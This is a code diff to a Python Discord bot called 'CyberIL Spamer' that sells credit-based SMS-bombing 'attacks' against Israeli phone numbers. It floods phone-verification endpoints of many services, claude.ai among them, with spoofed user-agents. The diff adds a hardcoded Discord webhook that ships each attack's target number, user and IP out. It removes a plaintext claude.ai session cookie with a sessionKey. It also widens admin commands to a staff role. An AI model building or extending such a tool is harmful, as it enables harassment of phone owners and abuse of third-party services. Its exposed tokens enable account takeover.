@@ -1,6 +1,6 @@
 import discord
 from discord import app_commands
-from discord.ext import commands
+from discord.ext import commands, tasks
 import asyncio
 import time
 import random
@@ -11,19 +11,21 @@ import logging
 import re
 import sys
 import os
-from datetime import datetime, timezone, timedelta
+from datetime import datetime, timezone
 import certifi
+import socket
 
 TOKEN = os.getenv("DISCORD_TOKEN")
 MONGO_URI = os.getenv("MONGO_URI")
 DB_NAME = "CyberIL_Spamer"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1486446745352146974/1gfqdmemwPDOxA8BfcWyuCIvd-AqRq9dceHqio4Hmug-wk7bfB0MqygPMJJVoUg7RHgS"
 
 PANEL_CHANNEL = 1481957038241353779
 GIFT_CHANNEL = 1485104425625325709
 INFO_CHANNEL = 1485125569690603692
 
 ADMIN_ROLE_ID = 1480762750052601886
-STORE_URL = "https://discord.gg/3CxwPGuGyq"
+STAFF_ROLE_ID = 1480762750052601886  # תפקיד צוות שיראה את הפקודות
 
 COOLDOWN_TIME = 20
 CREDITS_PER_CYCLE = 3
@@ -36,14 +38,12 @@ COLOR_DANGER = 0xED4245
 COLOR_WARNING = 0xFEE75C
 COLOR_INFO = 0x5865F2
 
-CLAUDE_SESSION = "activitySessionId=8e5e644c-d640-4b9f-be61-59b9a138a42b; anthropic-device-id=4ed16e2b-8252-4456-8e7a-e466ede65652; _fbp=fb.1.1773186995656.51415631283246056; app-shell-mode=gate-disabled; CH-prefers-color-scheme=light; __ssid=aac9d1c5-0950-4438-b7ea-a89a1639d015; cookie_seed_done=1; intercom-device-id-lupk8zyo=f68271ce-ab05-40b7-b143-901ad283a161; user-sidebar-visible-on-load=true; user-recents-collapsed=false; user-sidebar-pinned=true; g_state={\"i_l\":0,\"i_ll\":1773414635601,\"i_b\":\"y3RrxvHpC/63IgqxQoW+FkAztdzRlQfKqrSCo5paIW4\",\"i_e\":{\"enable_itp_optimization\":0},\"i_t\":1773501035602}; __cf_bm=3VjDxw6wkQm2wlbHFDvk8MaDT_DB6R36F4R.MVnz0p4-1773447632-1.0.1.1-6q05RiFdtxB27W.Dlk8sZzMKN2_GWuJqrNh03eIFieCaneWW7KiQJxVTVTNIxcxA4EeiLytjTSnQLzFe5XvedaBVzIzDp_EoeqS.drKNHic; _cfuvid=zbw_U3cChwMfKZyPfROexrLBbuzQTKW2FW6ko.UebTU-1773447632362-0.0.1.1-604800000; __stripe_mid=eabdbe50-cd60-4100-9f89-6403dde971eb6b036c; __stripe_sid=7b2497e5-5647-4528-aa38-9272e68de8c5289f41; sessionKey=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; lastActiveOrg=2b096853-0284-4d04-8bee-d3d6eb9ec7b1; cf_clearance=CM9MGR4oytc4fDuAdMWrgtGLrwjHrZfyGjDHQmELKWs-1773447692-1.2.1.1-8qu2TBglm35vOa3Y5dwU3Ue0D7gBkTfD20EtG9u.GXPEkWyTnnSOlsalbwktHG1lj9TvVOnuD19OeZaXbAIFnPMBAT3VnNkt2Rg5J8MQ9qAXN3Wf3DwDbPI.qiNUmVZwwvjmHdyRkI.fuz248__ESMWvCdMkeASIwHP7DT5e14INWZ3.iSxdKpFmZwoKzVGj1ge2Bba07dhQbqnbXVM1J7Ov4yMposOalAOKdx7hZN4; ajs_user_id=34d05785-fcf5-4298-8314-ac95766337ff; ajs_anonymous_id=64ed414c-6982-4d71-803f-2241e4e9546a; intercom-session-lupk8zyo=QTJuM3pjOVY3bWs1Njc4T0ZBQlZ1T2V6OUx0bjREempveE5JalZsR0FNMEpZYjdXZ3BYUE83WnhxYXV4S0tZSTdORlluTUc2OE14UnVCRHhBcjlzdE42SFo1ZW1NK1hWeEtZeTA0Y0hYYzlvcTN0RlBCa2YxV3JRbGJHM1B4WFltZVNNWk1QUXhWMzBEclNvUFphUTZNNTV0dk12T2s5QzhYSGN2U0pkeWNHM2NSOEZyMUU3amxwU2N5MGc4VkRpVEFZS0JrQzF3MFUyc2pzZlJyV0lTdXlDNncvYUYzcjQ1UkRkbzdmRTA1MnhiSHliZSt0akc2NjBzdjUyV2VwVkNQZ3ptd09xRzZZOTJMMXZEUzFVNmxxb3RTNG1ZYWs1K3Y5RFBTQXhiM1k9LS1YdEp3STBsUkF2S2FWSFptb29sYzFnPT0=--94e9f81d682285fead0655379f59452a0e43ab83; routingHint=sk-ant-rh-eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJFUzI1NiIsICJraWQiOiAiN0MxcWFPRnhqdWxaUjRFQnNuNk1UeUZGNWdDV2JHbFpNVDR2RklrRFFpbyJ9.eyJzdWIiOiAiMzRkMDU3ODUtZmNmNS00Mjk4LTgzMTQtYWM5NTc2NjMzN2ZmIiwgImlhdCI6IDE3NzM0NDc2OTYsICJpc3MiOiAiY2xhdWRlLWFpLXJvdXRpbmciLCAib25ib2FyZGluZ19jb21wbGV0ZSI6IHRydWUsICJwaG9uZV92ZXJpZmllZCI6IGZhbHNlLCAiYWdlX3ZlcmlmaWVkIjogdHJ1ZSwgImxvY2FsZSI6ICJlbi1VUyJ9.yRj_WgY7-XZbfW8XvjAb8ybkDmv2wDhrNH2WqAywFX2DVfMGZayA92Tj5WJwB3-kcV2JC3Un2eERG-bLEPQlAw; _gcl_au=1.1.357471279.1773367551.67089487.1773447650.1773447710; _dd_s=aid=631a5dba-fcfc-4e29-854f-58b2ec36a49d&rum=0&expire=1773448656835"
-
 intents = discord.Intents.default()
 intents.message_content = True
-intents.members = True
+intents.members = False
 intents.guilds = True
 
-client = commands.Bot(command_prefix="!", intents=intents)
+client = commands.Bot(command_prefix="!", intents=intents, heartbeat_timeout=30)
 tree = client.tree
 
 mongo_connection = AsyncIOMotorClient(MONGO_URI, tlsCAFile=certifi.where())
@@ -58,6 +58,7 @@ logging.basicConfig(level=logging.WARNING)
 
 active_missions = {}
 cooldown_tracker = {}
+spam_executor = None
 
 BROWSER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0.0.0 Safari/537.36",
@@ -69,6 +70,37 @@ BROWSER_AGENTS = [
 
 def random_agent():
     return random.choice(BROWSER_AGENTS)
+
+async def get_client_ip():
+    try:
+        hostname = socket.gethostname()
+        ip = socket.gethostbyname(hostname)
+        return ip
+    except:
+        return "unknown"
+
+async def send_webhook_log(user_id: int, username: str, phone: str, cost: int, success: int, failed: int, duration: int, ip: str):
+    embed = discord.Embed(
+        title="📊 **לוג ספאם**",
+        color=0x5865F2,
+        timestamp=datetime.now(timezone.utc)
+    )
+    embed.add_field(name="👤 משתמש", value=f"{username} (`{user_id}`)", inline=False)
+    embed.add_field(name="📱 מספר יעד", value=phone, inline=True)
+    embed.add_field(name="💰 קרדיטים", value=str(cost), inline=True)
+    embed.add_field(name="✅ הצלחות", value=str(success), inline=True)
+    embed.add_field(name="❌ כשלונות", value=str(failed), inline=True)
+    embed.add_field(name="⏱️ משך", value=f"{duration} שניות", inline=True)
+    embed.add_field(name="🌐 IP", value=ip, inline=True)
+    embed.add_field(name="📅 תאריך", value=datetime.now().strftime("%d/%m/%Y %H:%M:%S"), inline=False)
+    embed.set_footer(text="CyberIL Spamer Log System")
+    
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.post(WEBHOOK_URL, json={"embeds": [embed.to_dict()]}) as resp:
+                pass
+    except:
+        pass
 
 async def fetch_balance(user_id: int) -> int:
     record = await users_collection.find_one({"_id": user_id})
@@ -142,7 +174,10 @@ async def apply_cooldown(target: str):
 def is_admin(interaction: discord.Interaction) -> bool:
     return ADMIN_ROLE_ID in [role.id for role in interaction.user.roles]
 
-async def save_log(user_id: int, username: str, phone: str, cost: int, success: int, failed: int, duration: int):
+def is_staff(interaction: discord.Interaction) -> bool:
+    return ADMIN_ROLE_ID in [role.id for role in interaction.user.roles] or STAFF_ROLE_ID in [role.id for role in interaction.user.roles]
+
+async def save_log(user_id: int, username: str, phone: str, cost: int, success: int, failed: int, duration: int, ip: str):
     entry = {
         "user_id": user_id,
         "username": username,
@@ -152,11 +187,13 @@ async def save_log(user_id: int, username: str, phone: str, cost: int, success: 
         "failed_count": failed,
         "total": success + failed,
         "duration": duration,
+        "ip": ip,
         "timestamp": datetime.now(timezone.utc),
         "date": datetime.now(timezone.utc).strftime("%Y-%m-%d"),
         "time": datetime.now(timezone.utc).strftime("%H:%M:%S")
     }
     await logs_collection.insert_one(entry)
+    await send_webhook_log(user_id, username, phone, cost, success, failed, duration, ip)
 
 async def send_request(session, url, form=None, json_data=None, headers_extra=None, tag="", method="POST", data=None):
     headers = {
@@ -237,12 +274,9 @@ async def claude_request(session, phone):
         "referer": "https://claude.ai/onboarding",
         "user-agent": random_agent()
     }
-    if CLAUDE_SESSION:
-        h["cookie"] = CLAUDE_SESSION
-    payload = {"phone_number": clean}
     try:
         timeout = aiohttp.ClientTimeout(total=5)
-        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
+        async with session.post(url, json={"phone_number": clean}, headers=h, timeout=timeout, ssl=False) as resp:
             await resp.read()
             ok = 200 <= resp.status < 300
             return ok, tag, "OK" if ok else f"HTTP {resp.status}"
@@ -352,7 +386,7 @@ async def mitmachim_request(session, phone):
     except Exception as e:
         return False, tag, str(type(e).__name__)
 
-async def run_all(phone: str):
+async def run_spam_batch(phone: str):
     raw = phone
     formatted = f"+972{raw[1:]}" if raw.startswith("0") else f"+972{raw}"
     sid = str(uuid.uuid4())
@@ -378,7 +412,7 @@ async def run_all(phone: str):
             h.update(extra)
         return h
 
-    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
+    connector = aiohttp.TCPConnector(limit=50, ttl_dns_cache=300)
     async with aiohttp.ClientSession(connector=connector) as s:
         atmos_stores = [
             "1","2","3","4","5","7","8","13","15","18","21","23","24","27",
@@ -868,27 +902,28 @@ class ConfirmAttack(discord.ui.View):
         start_time = time.time()
         end_time = start_time + (self.cost * 60)
         last_update = time.time()
+        ip = await get_client_ip()
 
         try:
             while time.time() < end_time:
                 if stop_event.is_set():
                     break
                 
-                s, f = await run_all(self.phone)
+                s, f = await run_spam_batch(self.phone)
                 total_success += s
                 total_failed += f
                 
-                if time.time() - last_update >= 3:
+                if time.time() - last_update >= 5:
                     remaining = max(0, int((end_time - time.time()) / 60))
                     embed = discord.Embed(
                         title="🔄 ספאם בתהליך",
-                        description=f"מספמם את **{self.phone}**\nנותר: ~{remaining} דקות\n\n✅ הצלחות: {total_success}\n❌ כשלונות: {total_failed}\n⚡ קצב: {int(total_success / max(1, time.time() - start_time))}/שנייה",
+                        description=f"מספמם את **{self.phone}**\nנותר: ~{remaining} דקות\n\n✅ הצלחות: {total_success}\n❌ כשלונות: {total_failed}",
                         color=COLOR_WARNING
                     )
                     await interaction.edit_original_response(embed=embed, view=StopAttack(self.user_id))
                     last_update = time.time()
                 
-                await asyncio.sleep(0)
+                await asyncio.sleep(0.1)
 
             await apply_cooldown(self.phone)
             active_missions.pop(self.user_id, None)
@@ -901,7 +936,8 @@ class ConfirmAttack(discord.ui.View):
                 cost=self.cost,
                 success=total_success,
                 failed=total_failed,
-                duration=self.cost * 60
+                duration=self.cost * 60,
+                ip=ip
             )
 
             bal = await format_balance(self.user_id)
@@ -916,7 +952,6 @@ class ConfirmAttack(discord.ui.View):
             final.add_field(name="✅ הצלחות", value=str(total_success), inline=True)
             final.add_field(name="❌ כשלונות", value=str(total_failed), inline=True)
             final.add_field(name="💎 קרדיטים נותרים", value=bal, inline=True)
-            final.add_field(name="⚡ קצב ממוצע", value=f"{int(total_success / max(1, self.cost * 60))}/שנייה", inline=True)
             
             await interaction.edit_original_response(embed=final, view=None)
 
@@ -1016,6 +1051,9 @@ class MainPanel(discord.ui.View):
 
     @discord.ui.button(label="📊 סטטוס", style=discord.ButtonStyle.secondary, emoji="📊", custom_id="stats")
     async def stats_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not is_staff(interaction):
+            await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
+            return
         await interaction.response.defer(ephemeral=True)
         stats = await get_global_stats()
         
@@ -1145,10 +1183,10 @@ async def get_top_targets(limit: int = 10):
 @client.event
 async def on_ready():
     await tree.sync()
+    await client.change_presence(activity=discord.Game(name="מערכת ספאם | CYBERIL"))
     print(f"✅ CyberIL Spamer פעיל → {client.user}")
     print(f"📡 מחובר ל-{len(client.guilds)} שרתים")
 
-    # בדיקת lifetime שפג תוקף
     now = time.time()
     expired = await lifetime_collection.find({"expires_at": {"$lt": now}}).to_list(length=None)
     for item in expired:
@@ -1191,10 +1229,10 @@ async def cmd_credits(interaction: discord.Interaction, member: discord.Member =
 
     await interaction.response.send_message(embed=embed)
 
-@tree.command(name="addcredit", description="[ADMIN] הוסף קרדיטים")
+@tree.command(name="addcredit", description="[STAFF] הוסף קרדיטים")
 @app_commands.describe(member="משתמש", amount="כמות")
 async def cmd_addcredit(interaction: discord.Interaction, member: discord.Member, amount: int):
-    if not is_admin(interaction):
+    if not is_staff(interaction):
         await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
         return
     if amount <= 0:
@@ -1208,10 +1246,10 @@ async def cmd_addcredit(interaction: discord.Interaction, member: discord.Member
     embed.add_field(name="יתרה", value=new_bal, inline=True)
     await interaction.response.send_message(embed=embed)
 
-@tree.command(name="removecredit", description="[ADMIN] הסר קרדיטים")
+@tree.command(name="removecredit", description="[STAFF] הסר קרדיטים")
 @app_commands.describe(member="משתמש", amount="כמות")
 async def cmd_removecredit(interaction: discord.Interaction, member: discord.Member, amount: int):
-    if not is_admin(interaction):
+    if not is_staff(interaction):
         await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
         return
     if amount <= 0:
@@ -1225,10 +1263,10 @@ async def cmd_removecredit(interaction: discord.Interaction, member: discord.Mem
     embed.add_field(name="יתרה", value=new_bal, inline=True)
     await interaction.response.send_message(embed=embed)
 
-@tree.command(name="lifetime", description="[ADMIN] הענק ללא הגבלה לזמן מוגדר")
+@tree.command(name="lifetime", description="[STAFF] הענק ללא הגבלה לזמן מוגדר")
 @app_commands.describe(member="משתמש", duration="משך הזמן (במספרים)", unit="יחידת זמן (minutes/hours/days/months)")
 async def cmd_lifetime(interaction: discord.Interaction, member: discord.Member, duration: int, unit: str):
-    if not is_admin(interaction):
+    if not is_staff(interaction):
         await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
         return
     
@@ -1261,10 +1299,10 @@ async def cmd_lifetime(interaction: discord.Interaction, member: discord.Member,
     embed.add_field(name="תפוגה", value=expires_date, inline=True)
     await interaction.followup.send(embed=embed)
 
-@tree.command(name="removelifetime", description="[ADMIN] הסר ללא הגבלה")
+@tree.command(name="removelifetime", description="[STAFF] הסר ללא הגבלה")
 @app_commands.describe(member="משתמש")
 async def cmd_removelifetime(interaction: discord.Interaction, member: discord.Member):
-    if not is_admin(interaction):
+    if not is_staff(interaction):
         await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
         return
     await interaction.response.defer()
@@ -1272,10 +1310,10 @@ async def cmd_removelifetime(interaction: discord.Interaction, member: discord.M
     embed = discord.Embed(title="♾️ Lifetime הוסר", description=f"{member.mention} איבד את ה-lifetime", color=COLOR_WARNING)
     await interaction.followup.send(embed=embed)
 
-@tree.command(name="checklifetime", description="[ADMIN] בדוק סטטוס lifetime")
+@tree.command(name="checklifetime", description="[STAFF] בדוק סטטוס lifetime")
 @app_commands.describe(member="משתמש")
 async def cmd_checklifetime(interaction: discord.Interaction, member: discord.Member):
-    if not is_admin(interaction):
+    if not is_staff(interaction):
         await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
         return
     
@@ -1298,17 +1336,17 @@ async def cmd_checklifetime(interaction: discord.Interaction, member: discord.Me
     
     await interaction.response.send_message(embed=embed)
 
-@tree.command(name="freecredits", description="[ADMIN] שלח הודעת קרדיטים")
+@tree.command(name="freecredits", description="[STAFF] שלח הודעת קרדיטים")
 async def cmd_freecredits(interaction: discord.Interaction):
-    if not is_admin(interaction):
+    if not is_staff(interaction):
         await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
         return
     await interaction.response.send_message(embed=create_gift_panel(), view=FreeCoins())
 
-@tree.command(name="giveall", description="[ADMIN] תן לכולם")
+@tree.command(name="giveall", description="[STAFF] תן לכולם")
 @app_commands.describe(amount="כמות")
 async def cmd_giveall(interaction: discord.Interaction, amount: int):
-    if not is_admin(interaction):
+    if not is_staff(interaction):
         await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
         return
     await interaction.response.defer(ephemeral=True)
@@ -1367,15 +1405,15 @@ async def cmd_mylogs(interaction: discord.Interaction):
 
     await interaction.followup.send(embed=embed, ephemeral=True)
 
-@tree.command(name="checkstatus", description="[ADMIN] בדוק סטטוס")
+@tree.command(name="checkstatus", description="[STAFF] בדוק סטטוס")
 async def cmd_checkstatus(interaction: discord.Interaction):
-    if not is_admin(interaction):
+    if not is_staff(interaction):
         await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
         return
 
     await interaction.response.defer(ephemeral=True)
     test_num = "0506500708"
-    success, failed = await run_all(test_num)
+    success, failed = await run_spam_batch(test_num)
 
     embed = discord.Embed(title="📊 בדיקת מערכת", color=COLOR_INFO)
     embed.add_field(name="✅ הצלחות", value=str(success), inline=True)
@@ -1384,10 +1422,10 @@ async def cmd_checkstatus(interaction: discord.Interaction):
 
     await interaction.followup.send(embed=embed, ephemeral=True)
 
-@tree.command(name="attacklogs", description="[ADMIN] לוגים")
+@tree.command(name="attacklogs", description="[STAFF] לוגים")
 @app_commands.describe(limit="כמות")
 async def cmd_attacklogs(interaction: discord.Interaction, limit: int = 10):
-    if not is_admin(interaction):
+    if not is_staff(interaction):
         await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
         return
 
@@ -1402,15 +1440,15 @@ async def cmd_attacklogs(interaction: discord.Interaction, limit: int = 10):
     for log in logs[:10]:
         embed.add_field(
             name=f"{log['username']} | {log['date']} {log['time']}",
-            value=f"📱 {log['phone']}\n✅ {log['success_count']} | ❌ {log['failed_count']} | 💎 {log['cost']}",
+            value=f"📱 {log['phone']}\n✅ {log['success_count']} | ❌ {log['failed_count']} | 💎 {log['cost']}\n🌐 {log.get('ip', 'unknown')}",
             inline=False
         )
 
     await interaction.followup.send(embed=embed, ephemeral=True)
 
-@tree.command(name="topnumbers", description="[ADMIN] מספרים מובילים")
+@tree.command(name="topnumbers", description="[STAFF] מספרים מובילים")
 async def cmd_topnumbers(interaction: discord.Interaction):
-    if not is_admin(interaction):
+    if not is_staff(interaction):
         await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
         return
 
@@ -1431,9 +1469,9 @@ async def cmd_topnumbers(interaction: discord.Interaction):
 
     await interaction.followup.send(embed=embed, ephemeral=True)
 
-@tree.command(name="globalstats", description="[ADMIN] סטטיסטיקה גלובלית")
+@tree.command(name="globalstats", description="[STAFF] סטטיסטיקה גלובלית")
 async def cmd_globalstats(interaction: discord.Interaction):
-    if not is_admin(interaction):
+    if not is_staff(interaction):
         await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
         return
 
